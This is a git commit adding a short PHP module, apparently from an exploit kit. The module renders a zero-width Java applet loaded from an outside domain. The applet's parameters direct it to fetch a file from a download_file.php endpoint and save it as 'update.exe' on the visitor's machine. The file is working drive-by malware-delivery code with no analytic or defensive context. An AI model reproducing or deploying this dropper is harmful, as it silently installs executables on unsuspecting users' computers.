c571003aac4f290b855f241579203503d10de73a
Chance <84702008+non-compliant@users.noreply.github.com>
2021-05-29 19:54:35 -0700

    Add files via upload

---
+++ deobed/modules/JavaSignedApplet.php
@@ -0,0 +1,7 @@
+<?php
+include_once("config.php"); ?>
+
+<Applet Code="OracleJava.class" archive="<? echo 'http://drztgoddobmyr.com/555/ble/modules/helpers/JavaSignedApplet.jar'; ?>" width="0" Height="1">
+<PARAM NAME="Destination" VALUE="update.exe">
+<PARAM NAME="Source" VALUE="<? echo $config_url . '/download_file.php?e=JavaSignedApplet'; ?>">
+</applet>
